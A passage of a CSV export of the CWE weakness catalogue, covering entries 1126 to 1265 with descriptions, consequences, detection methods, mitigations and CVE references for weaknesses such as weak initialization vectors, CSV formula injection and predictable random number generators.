ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"\",\"\",\"\",\"\",,,\"\",,\"\",\n1126,\"Declaration of Variable with Unnecessarily Wide Scope\",Base,Incomplete,\"The source code declares a variable in one scope, but the variable is only used within a narrower scope.\",\"This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"\",,\"\",\n1127,\"Compilation with Insufficient Warnings or Errors\",Base,Incomplete,\"The code is compiled without sufficient warnings enabled, which may prevent the detection of subtle bugs or quality issues.\",\"This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"::PHASE:Build and Compilation::\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"\",,\"\",\n1173,\"Improper Use of Validation Framework\",Base,Draft,\"The product does not use, or incorrectly uses, an input validation framework that is provided by the source language or an independent library.\",\"Many modern coding languages provide developers with input validation frameworks to make the task of input validation easier and less error-prone. These frameworks will automatically check all input against specified criteria and direct execution to error handlers when invalid input is received. The improper use (i.e., an incorrect implementation or missing altogether) of these frameworks is not directly exploitable, but can lead to an exploitable condition if proper input validation is not performed later in the product. Not using provided input validation frameworks can also hurt the maintainability of code as future developers may not recognize the downstream input validation being used in the place of the validation framework.\",::NATURE:ChildOf:CWE ID:20:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:This weakness may occur when software designers choose to not leverage input validation frameworks provided by the source language.::PHASE:Implementation:NOTE:This weakness may occur when developers do not correctly use a provided input validation framework.::\",\"\",,\"::SCOPE:Integrity:IMPACT:Unexpected State:NOTE:Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Some instances of improper input validation can be detected using automated static analysis. A static analysis tool might allow the user to specify which application-specific methods or functions perform input validation; the tool might also have built-in knowledge of validation frameworks such as Struts. The tool may then suppress or de-prioritize any associated warnings. This allows the analyst to focus on areas of the software in which input validation does not appear to be present. Except in the cases described in the previous paragraph, automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.::\",\"::PHASE:Implementation:DESCRIPTION:Properly use provided input validation frameworks.::\",\"\",,,\"\",,\"\",\n1188,\"Initialization of a Resource with an Insecure Default\",Base,Incomplete,\"The product initializes or sets a resource with a default that is intended to be changed by the administrator, but the default is not secure.\",\"Developers often choose default values that leave the product as open and easy to use as possible out-of-the-box, under the assumption that the administrator can (or should) change the default value. However, this ease-of-use comes at a cost when the default is insecure and the administrator does not change it.\",::NATURE:ChildOf:CWE ID:1419:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:665:VIEW ID:1003:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",,\"\",\"\",\"\",\"\",,\"\",\"\",\"\",\"::REFERENCE:CVE-2022-36349:DESCRIPTION:insecure default variable initialization in BIOS firmware for a hardware board allows DoS:LINK:https://www.cve.org/CVERecord?id=CVE-2022-36349::REFERENCE:CVE-2022-42467:DESCRIPTION:A generic database browser interface has a default mode that exposes a web server to the network, allowing queries to the database.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-42467::\",,,\"\",::665::,\"::TYPE:Maintenance:NOTE:This entry improves organization of concepts under initialization. The typical CWE model is to cover Missing and Incorrect behaviors. Arguably, this entry could be named as Incorrect instead of Insecure. This might be changed in the near future.::\",\n1204,\"Generation of Weak Initialization Vector (IV)\",Base,Incomplete,\"The product uses a cryptographic primitive that uses an Initialization Vector (IV), but the product does not generate IVs that are sufficiently unpredictable or unique according to the expected cryptographic requirements for that primitive.\",\"By design, some cryptographic primitives (such as block ciphers) require that IVs must have certain properties for the uniqueness and/or unpredictability of an IV. Primitives may vary in how important these properties are. If these properties are not maintained, e.g. by a bug in the code, then the cryptography may be weakened or broken by attacking the IVs themselves.\",::NATURE:ChildOf:CWE ID:330:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:If the IV is not properly initialized, data that is encrypted can be compromised and information about the data can be leaked. See [REF-1179].::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Different cipher modes have different requirements for their IVs. When choosing and implementing a mode, it is important to understand those requirements in order to keep security guarantees intact. Generally, it is safest to generate a random IV, since it will be both unpredictable and have a very low chance of being non-unique. IVs do not have to be kept secret, so if generating duplicate IVs is a concern, a list of already-used IVs can be kept and checked against. NIST offers recommendations on generation of IVs for modes of which they have approved. These include options for when random IVs are not practical. For CBC, CFB, and OFB, see [REF-1175]; for GCM, see [REF-1178].::\",\"::REFERENCE:CVE-2020-1472:DESCRIPTION:ZeroLogon vulnerability - use of a static IV of all zeroes in AES-CFB8 mode:LINK:https://www.cve.org/CVERecord?id=CVE-2020-1472::REFERENCE:CVE-2011-3389:DESCRIPTION:BEAST attack in SSL 3.0 / TLS 1.0. In CBC mode, chained initialization vectors are non-random, allowing decryption of HTTPS traffic using a chosen plaintext attack.:LINK:https://www.cve.org/CVERecord?id=CVE-2011-3389::REFERENCE:CVE-2001-0161:DESCRIPTION:wireless router does not use 6 of the 24 bits for WEP encryption, making it easier for attackers to decrypt traffic:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0161::REFERENCE:CVE-2001-0160:DESCRIPTION:WEP card generates predictable IV values, making it easier for attackers to decrypt traffic:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0160::REFERENCE:CVE-2017-3225:DESCRIPTION:device bootloader uses a zero initialization vector during AES-CBC:LINK:https://www.cve.org/CVERecord?id=CVE-2017-3225::REFERENCE:CVE-2016-6485:DESCRIPTION:crypto framework uses PHP rand function - which is not cryptographically secure - for an initialization vector:LINK:https://www.cve.org/CVERecord?id=CVE-2016-6485::REFERENCE:CVE-2014-5386:DESCRIPTION:encryption routine does not seed the random number generator, causing the same initialization vector to be generated repeatedly:LINK:https://www.cve.org/CVERecord?id=CVE-2014-5386::REFERENCE:CVE-2020-5408:DESCRIPTION:encryption functionality in an authentication framework uses a fixed null IV with CBC mode, allowing attackers to decrypt traffic in applications that use this functionality:LINK:https://www.cve.org/CVERecord?id=CVE-2020-5408::REFERENCE:CVE-2017-17704:DESCRIPTION:messages for a door-unlocking product use a fixed IV in CBC mode, which is the same after each restart:LINK:https://www.cve.org/CVERecord?id=CVE-2017-17704::REFERENCE:CVE-2017-11133:DESCRIPTION:application uses AES in CBC mode, but the pseudo-random secret and IV are generated using math.random, which is not cryptographically strong.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-11133::REFERENCE:CVE-2007-3528:DESCRIPTION:Blowfish-CBC implementation constructs an IV where each byte is calculated modulo 8 instead of modulo 256, resulting in less than 12 bits for the effective IV length, and less than 4096 possible IV values.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-3528::\",::Cryptography::,,\"\",::20::97::,\"::TYPE:Maintenance:NOTE:As of CWE 4.5, terminology related to randomness, entropy, and predictability can vary widely. Within the developer and other communities, randomness is used heavily. However, within cryptography, entropy is distinct, typically implied as a measurement. There are no commonly-used definitions, even within standards documents and cryptography papers. Future versions of CWE will attempt to define these terms and, if necessary, distinguish between them in ways that are appropriate for different communities but do not reduce the usability of CWE for mapping, understanding, or other scenarios.::\",\n1220,\"Insufficient Granularity of Access Control\",Base,Incomplete,\"The product implements access controls via a policy or other feature with the intention to disable or restrict accesses (reads and/or writes) to assets in a system from untrusted agents. However, implemented access controls lack required granularity, which renders the control policy too broad because it allows accesses from unauthorized agents to the security-sensitive assets.\",\"Integrated circuits and hardware engines can expose accesses to assets (device configuration, keys, etc.) to trusted firmware or a software module (commonly set by BIOS/bootloader). This access is typically access-controlled. Upon a power reset, the hardware or system usually starts with default values in registers, and the trusted firmware (Boot firmware) configures the necessary access-control protection. A common weakness that can exist in such protection schemes is that access controls or policies are not granular enough. This condition allows agents beyond trusted agents to access assets and could lead to a loss of functionality or the ability to set up the device securely. This further results in security risks from leaked, sensitive, key material to modification of device configuration.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:Such issues could be introduced during hardware architecture and design and identified later during Testing or System Configuration phases.::PHASE:Implementation:NOTE:Such issues could be introduced during hardware implementation and identified later during Testing or System Configuration phases.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:IMPACT:Other:LIKELIHOOD:High::\",\"\",\"::PHASE:Architecture and Design Implementation Testing:DESCRIPTION:Access-control-policy protections must be reviewed for design inconsistency and common weaknesses. Access-control-policy definition and programming flow must be tested in pre-silicon, post-silicon testing.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2022-24985:DESCRIPTION:A form hosting website only checks the session authentication status for a single form, making it possible to bypass authentication when there are multiple forms:LINK:https://www.cve.org/CVERecord?id=CVE-2022-24985::REFERENCE:CVE-2021-36934:DESCRIPTION:An operating system has an overly permission Access Control List onsome system files, including those related to user passwords:LINK:https://www.cve.org/CVERecord?id=CVE-2021-36934::\",,,\"\",::1::180::,\"\",\n1230,\"Exposure of Sensitive Information Through Metadata\",Base,Incomplete,\"The product prevents direct access to a resource containing sensitive information, but it does not sufficiently limit access to metadata that is derived from the original, sensitive information.\",\"Developers might correctly prevent unauthorized access to a database or other resource containing sensitive information, but they might not consider that portions of the original information might also be recorded in metadata, search indices, statistical reports, or other resources. If these resources are not also restricted, then attackers might be able to extract some or all of the original information, or otherwise infer some details. For example, an attacker could specify search terms that are known to be unique to a particular person, or view metadata such as activity or creation dates in order to identify usage patterns.\",::NATURE:ChildOf:CWE ID:285:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::\",\"\",,\"\",\"\",\"\",\"\",,,\"\",,\"\",\n1235,\"Incorrect Use of Autoboxing and Unboxing for Performance Critical Operations\",Base,Incomplete,\"The code uses boxed primitives, which may introduce inefficiencies into performance-critical operations.\",\"Languages such as Java and C# support automatic conversion through their respective compilers from primitive types into objects of the corresponding wrapper classes, and vice versa. For example, a compiler might convert an int to Integer (called autoboxing) or an Integer to int (called unboxing). This eliminates forcing the programmer to perform these conversions manually, which makes the code cleaner. However, this feature comes at a cost of performance and can lead to resource exhaustion and impact availability when used with generic collections. Therefore, they should not be used for scientific computing or other performance critical operations. They are only suited to support impedance mismatch between reference types and primitives.\",::NATURE:ChildOf:CWE ID:400:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C#:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:The programmer may use boxed primitives when not strictly necessary.::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Resource Consumption (CPU):IMPACT:DoS: Resource Consumption (Memory):IMPACT:DoS: Resource Consumption (Other):IMPACT:Reduce Performance:LIKELIHOOD:Low:NOTE:Incorrect autoboxing/unboxing would result in reduced performance, which sometimes can lead to resource consumption issues.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Use of boxed primitives should be limited to certain situations such as when calling methods with typed parameters. Examine the use of boxed primitives prior to use. Use SparseArrays or ArrayMap instead of HashMap to avoid performance overhead.::\",\"\",,,\"::TAXONOMY NAME:SEI CERT Oracle Coding Standard for Java:ENTRY ID:EXP04-J:ENTRY NAME:Do not pass arguments to certain Java Collections Framework methods that are a different type than the collection parameter type::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SI-2::\",,\"\",\n1236,\"Improper Neutralization of Formula Elements in a CSV File\",Base,Incomplete,\"The product saves user-provided information into a Comma-Separated Value (CSV) file, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as a command when the file is opened by a spreadsheet product.\",\"User-provided data is often saved to traditional databases. This data can be exported to a CSV file, which allows users to read the data using spreadsheet software such as Excel, Numbers, or Calc. This software interprets entries beginning with '=' as formulas, which are then executed by the spreadsheet software. The software's formula language often allows methods to access hyperlinks or the local command line, and frequently allows enough characters to invoke an entire script. Attackers can populate data fields which, when saved to a CSV file, may attempt information exfiltration or other malicious activity when automatically executed by the spreadsheet software.\",::NATURE:ChildOf:CWE ID:74:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:74:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Other:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"::TERM:CSV Injection::TERM:Formula Injection::TERM:Excel Macro Injection::\",\"::PHASE:Implementation:NOTE:The weakness is in the implementation of a software's CSV export feature, in particular how it formats formula entries as the output gets flattened into a text file.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:IMPACT:Execute Unauthorized Code or Commands:LIKELIHOOD:Low:NOTE:Current versions of Excel warn users of untrusted content.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:When generating CSV output, ensure that formula-sensitive metacharacters are effectively escaped or removed from all data before storage in the resultant CSV. Risky characters include '=' (equal), '+' (plus), '-' (minus), and '@' (at).:EFFECTIVENESS:Moderate::PHASE:Implementation:DESCRIPTION:If a field starts with a formula character, prepend it with a ' (single apostrophe), which prevents Excel from executing the formula.:EFFECTIVENESS:Moderate::PHASE:Architecture and Design:DESCRIPTION:Certain implementations of spreadsheet software might disallow formulas from executing if the file is untrusted, or if the file is not authored by the current user.:EFFECTIVENESS:Limited::\",\"::REFERENCE:CVE-2019-12134:DESCRIPTION:Low privileged user can trigger CSV injection through a contact form field value:LINK:https://www.cve.org/CVERecord?id=CVE-2019-12134::REFERENCE:CVE-2019-4521:DESCRIPTION:Cloud management product allows arbitrary command execution via CSV injection:LINK:https://www.cve.org/CVERecord?id=CVE-2019-4521::REFERENCE:CVE-2019-17661:DESCRIPTION:CSV injection in content management system via formula code in a first or last name:LINK:https://www.cve.org/CVERecord?id=CVE-2019-17661::\",,,\"\",,\"\",\n1240,\"Use of a Cryptographic Primitive with a Risky Implementation\",Base,Draft,\"To fulfill the need for a cryptographic primitive, the product implements a cryptographic algorithm using a non-standard, unproven, or disallowed/non-compliant cryptographic implementation.\",\"Cryptographic protocols and systems depend on cryptographic primitives (and associated algorithms) as their basic building blocks. Some common examples of primitives are digital signatures, one-way hash functions, ciphers, and public key cryptography; however, the notion of primitive can vary depending on point of view. See Terminology Notes for further explanation of some concepts. Cryptographic primitives are defined to accomplish one very specific task in a precisely defined and mathematically reliable fashion. For example, suppose that for a specific cryptographic primitive (such as an encryption routine), the consensus is that the primitive can only be broken after trying out N different inputs (where the larger the value of N, the stronger the cryptography). For an encryption scheme like AES-256, one would expect N to be so large as to be infeasible to execute in a reasonable amount of time. If a vulnerability is ever found that shows that one can break a cryptographic primitive in significantly less than the expected number of attempts, then that primitive is considered weakened (or sometimes in extreme cases, colloquially it is broken). As a result, anything using this cryptographic primitive would now be considered insecure or risky. Thus, even breaking or weakening a seemingly small cryptographic primitive has the potential to render the whole system vulnerable, due to its reliance on the primitive. A historical example can be found in TLS when using DES. One would colloquially call DES the cryptographic primitive for transport encryption in this version of TLS. In the past, DES was considered strong, because no weaknesses were found in it; importantly, DES has a key length of 56 bits. Trying N=2^56 keys was considered impractical for most actors. Unfortunately, attacking a system with 56-bit keys is now practical via brute force, which makes defeating DES encryption practical. It is now practical for an adversary to read any information sent under this version of TLS and use this information to attack the system. As a result, it can be claimed that this use of TLS is weak, and that any system depending on TLS with DES could potentially render the entire system vulnerable to attack. Cryptographic primitives and associated algorithms are only considered safe after extensive research and review from experienced cryptographers from academia, industry, and government entities looking for any possible flaws. Furthermore, cryptographic primitives and associated algorithms are frequently reevaluated for safety when new mathematical and attack techniques are discovered. As a result and over time, even well-known cryptographic primitives can lose their compliance status with the discovery of novel attacks that might either defeat the algorithm or reduce its robustness significantly. If ad-hoc cryptographic primitives are implemented, it is almost certain that the implementation will be vulnerable to attacks that are well understood by cryptographers, resulting in the exposure of sensitive information and other consequences. This weakness is even more difficult to manage for hardware-implemented deployment of cryptographic algorithms. First, because hardware is not patchable as easily as software, any flaw discovered after release and production typically cannot be fixed without a recall of the product. Secondly, the hardware product is often expected to work for years, during which time computation power available to the attacker only increases. Therefore, for hardware implementations of cryptographic primitives, it is absolutely essential that only strong, proven cryptographic primitives are used.\",::NATURE:ChildOf:CWE ID:327:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:This weakness is primarily introduced during the architecture and design phase as risky primitives are included.::PHASE:Implementation:NOTE:Even in cases where the Architectural phase properly specifies a cryptographically secure design, the design may be changed during implementation due to unforeseen constraints.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:LIKELIHOOD:High:NOTE:Incorrect usage of crypto primitives could render the supposedly encrypted data as unencrypted plaintext in the worst case.::\",\"::METHOD:Architecture or Design Review:DESCRIPTION:Review requirements, documentation, and product design to ensure that primitives are consistent with the strongest-available recommendations from trusted parties. If the product appears to be using custom or proprietary implementations that have not had sufficient public review and approval, then this is a significant concern.:EFFECTIVENESS:High::METHOD:Manual Analysis:DESCRIPTION:Analyze the product to ensure that implementations for each primitive do not contain any known vulnerabilities and are not using any known-weak algorithms, including MD4, MD5, SHA1, DES, etc.:EFFECTIVENESS:Moderate::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:For hardware, during the implementation (pre-Silicon / post-Silicon) phase, dynamic tests should be done to ensure that outputs from cryptographic routines are indeed working properly, such as test vectors provided by NIST [REF-1236].:EFFECTIVENESS:Moderate::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:It needs to be determined if the output of a cryptographic primitive is lacking entropy, which is one clear sign that something went wrong with the crypto implementation. There exist many methods of measuring the entropy of a bytestream, from sophisticated ones (like calculating Shannon's entropy of a sequence of characters) to crude ones (by compressing it and comparing the size of the original bytestream vs. the compressed - a truly random byte stream should not be compressible and hence the uncompressed and compressed bytestreams should be nearly identical in size).:EFFECTIVENESS:Moderate::\",\"::PHASE:Requirements:DESCRIPTION:Require compliance with the strongest-available recommendations from trusted parties, and require that compliance must be kept up-to-date, since recommendations evolve over time. For example, US government systems require FIPS 140-3 certification, which supersedes FIPS 140-2 [REF-1192] [REF-1226].:EFFECTIVENESS:High::PHASE:Architecture and Design:DESCRIPTION:Ensure that the architecture/design uses the strongest-available primitives and algorithms from trusted parties. For example, US government systems require FIPS 140-3 certification, which supersedes FIPS 140-2 [REF-1192] [REF-1226].:EFFECTIVENESS:High::PHASE:Architecture and Design:DESCRIPTION:Do not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. As with all cryptographic mechanisms, the source code should be available for analysis. If the algorithm may be compromised when attackers find out how it works, then it is especially weak.:EFFECTIVENESS:Discouraged Common Practice::PHASE:Architecture and Design:DESCRIPTION:Try not to use cryptographic algorithms in novel ways or with new modes of operation even when you know it is secure. For example, using SHA-2 chaining to create a 1-time pad for encryption might sound like a good idea, but one should not do this.:EFFECTIVENESS:Discouraged Common Practice::PHASE:Architecture and Design:DESCRIPTION:Ensure that the design can replace one cryptographic primitive or algorithm with another in the next generation (cryptographic agility). Where possible, use wrappers to make the interfaces uniform. This will make it easier to upgrade to stronger algorithms. This is especially important for hardware, which can be more difficult to upgrade quickly than software; design the hardware at a replaceable block level.:EFFECTIVENESS:Defense in Depth::PHASE:Architecture and Design:DESCRIPTION:Do not use outdated or non-compliant cryptography algorithms. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong [REF-267].:EFFECTIVENESS:Discouraged Common Practice::PHASE:Architecture and Design Implementation:DESCRIPTION:Do not use a linear-feedback shift register (LFSR) or other legacy methods as a substitute for an accepted and standard Random Number Generator.:EFFECTIVENESS:Discouraged Common Practice::PHASE:Architecture and Design Implementation:DESCRIPTION:Do not use a checksum as a substitute for a cryptographically generated hash.:EFFECTIVENESS:Discouraged Common Practice::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted cryptographic library or framework. Industry-standard implementations will save development time and are more likely to avoid errors that can occur during implementation of cryptographic algorithms. However, the library/framework could be used incorrectly during implementation.:EFFECTIVENESS:High::PHASE:Architecture and Design Implementation:DESCRIPTION:When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for the prevention of common attacks.:EFFECTIVENESS:Moderate::PHASE:Architecture and Design Implementation:DESCRIPTION:Do not store keys in areas accessible to untrusted agents. Carefully manage and protect the cryptographic keys (see CWE-320). If the keys can be guessed or stolen, then the strength of the cryptography algorithm is irrelevant.:EFFECTIVENESS:Moderate::\",\"::REFERENCE:CVE-2020-4778:DESCRIPTION:software uses MD5, which is less safe than the default SHA-256 used by related products:LINK:https://www.cve.org/CVERecord?id=CVE-2020-4778::REFERENCE:CVE-2005-2946:DESCRIPTION:Default configuration of product uses MD5 instead of stronger algorithms that are available, simplifying forgery of certificates.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2946::REFERENCE:CVE-2019-3907:DESCRIPTION:identity card uses MD5 hash of a salt and password:LINK:https://www.cve.org/CVERecord?id=CVE-2019-3907::REFERENCE:CVE-2021-34687:DESCRIPTION:personal key is transmitted over the network using a substitution cipher:LINK:https://www.cve.org/CVERecord?id=CVE-2021-34687::REFERENCE:CVE-2020-14254:DESCRIPTION:product does not disable TLS-RSA cipher suites, allowing decryption of traffic if TLS 2.0 and secure ciphers are not enabled.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-14254::REFERENCE:CVE-2019-1543:DESCRIPTION:SSL/TLS library generates 16-byte nonces but reduces them to 12 byte nonces for the ChaCha20-Poly1305 cipher, converting them in a way that violates the cipher's requirements for unique nonces.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-1543::REFERENCE:CVE-2017-9267:DESCRIPTION:LDAP interface allows use of weak ciphers:LINK:https://www.cve.org/CVERecord?id=CVE-2017-9267::REFERENCE:CVE-2017-7971:DESCRIPTION:SCADA product allows use of outdated cipher suites:LINK:https://www.cve.org/CVERecord?id=CVE-2017-7971::REFERENCE:CVE-2020-6616:DESCRIPTION:Chip implementing Bluetooth uses a low-entropy PRNG instead of a hardware RNG, allowing spoofing.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-6616::REFERENCE:CVE-2019-1715:DESCRIPTION:security product has insufficient entropy in the DRBG, allowing collisions and private key discovery:LINK:https://www.cve.org/CVERecord?id=CVE-2019-1715::REFERENCE:CVE-2014-4192:DESCRIPTION:Dual_EC_DRBG implementation in RSA toolkit does not correctly handle certain byte requests, simplifying plaintext recovery:LINK:https://www.cve.org/CVERecord?id=CVE-2014-4192::REFERENCE:CVE-2007-6755:DESCRIPTION:Recommendation for Dual_EC_DRBG algorithm contains point Q constants that could simplify decryption:LINK:https://www.cve.org/CVERecord?id=CVE-2007-6755::\",,,\"\",::97::,\"::TYPE:Terminology:NOTE:Terminology for cryptography varies widely, from informal and colloquial to mathematically-defined, with different precision and formalism depending on whether the stakeholder is a developer, cryptologist, etc. Yet there is a need for CWE to be self-consistent while remaining understandable and acceptable to multiple audiences. As of CWE 4.6, CWE terminology around primitives and algorithms is emerging as shown by the following example, subject to future consultation and agreement within the CWE and cryptography communities. Suppose one wishes to send encrypted data using a CLI tool such as OpenSSL. One might choose to use AES with a 256-bit key and require tamper protection (GCM mode, for instance). For compatibility's sake, one might also choose the ciphertext to be formatted to the PKCS#5 standard. In this case, the cryptographic system would be AES-256-GCM with PKCS#5 formatting. The cryptographic function would be AES-256 in the GCM mode of operation, and the algorithm would be AES. Colloquially, one would say that AES (and sometimes AES-256) is the cryptographic primitive, because it is the algorithm that realizes the concept of symmetric encryption (without modes of operation or other protocol related modifications). In practice, developers and architects typically refer to base cryptographic algorithms (AES, SHA, etc.) as cryptographic primitives.::TYPE:Maintenance:NOTE:Since CWE 4.4, various cryptography-related entries, including CWE-327 and CWE-1240, have been slated for extensive research, analysis, and community consultation to define consistent terminology, improve relationships, and reduce overlap or duplication. As of CWE 4.6, this work is still ongoing.::\",\n1241,\"Use of Predictable Algorithm in Random Number Generator\",Base,Draft,\"The device uses an algorithm that is predictable and generates a pseudo-random number.\",\"Pseudo-random number generator algorithms are predictable because their registers have a finite number of possible states, which eventually lead to repeating patterns. As a result, pseudo-random number generators (PRNGs) can compromise their randomness or expose their internal state to various attacks, such as reverse engineering or tampering. It is highly recommended to use hardware-based true random number generators (TRNGs) to ensure the security of encryption schemes. TRNGs generate unpredictable, unbiased, and independent random numbers because they employ physical phenomena, e.g., electrical noise, as sources to generate random numbers.\",::NATURE:ChildOf:CWE ID:330:VIEW ID:1000:ORDINAL:Primary::,\"\",::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:In many cases, the design originally defines a cryptographically secure random number generator, but is then changed during implementation due to unforeseen constraints.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:LIKELIHOOD:High::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:A true random number generator should be specified for cryptographic algorithms.::PHASE:Implementation:DESCRIPTION:A true random number generator should be implemented for cryptographic algorithms.::\",\"::REFERENCE:CVE-2021-3692:DESCRIPTION:PHP framework uses mt_rand() function (Marsenne Twister) when generating tokens:LINK:https://www.cve.org/CVERecord?id=CVE-2021-3692::\",,,\"\",::97::,\"::TYPE:Maintenance:NOTE:As of CWE 4.5, terminology related to randomness, entropy, and predictability can vary widely. Within the developer and other communities, randomness is used heavily. However, within cryptography, entropy is distinct, typically implied as a measurement. There are no commonly-used definitions, even within standards documents and cryptography papers. Future versions of CWE will attempt to define these terms and, if necessary, distinguish between them in ways that are appropriate for different communities but do not reduce the usability of CWE for mapping, understanding, or other scenarios.::\",\n1265,\"Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\",Base,Draft,\"During execution of non-reentrant code, the product performs a call that unintentionally produces a nested invocation of the non-reentrant code.\",\"In a complex product, a single function call may lead to many different possible code paths, some of which may involve deeply nested calls. It may be difficult to foresee all possible code paths that could emanate from a given function call. In some systems, an external actor can manipulate inputs to the system and thereby achieve a wide range of possible control flows. This is frequently a concern in products that execute scripts from untrusted sources. Examples of such products are web browsers and PDF readers. A weakness is present when one of the possible code paths resulting from a function call alters program state that the original caller assumes to be unchanged during the call.\",::NATURE:ChildOf:CWE ID:691:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:663:VIEW ID:1000::NATURE:CanPrecede:CWE ID:416:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"\",\"\",,\"::SCOPE:Integrity:IMPACT:Unexpected State:LIKELIHOOD:Unknown:NOTE:Exploitation of this weakness can leave the application in an unexpected state and cause variables to be reassigned before the first invocation has completed. This may eventually result in memory corruption or unexpected code execution.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:When architecting a system that will execute untrusted code in response to events, consider executing the untrusted event handlers 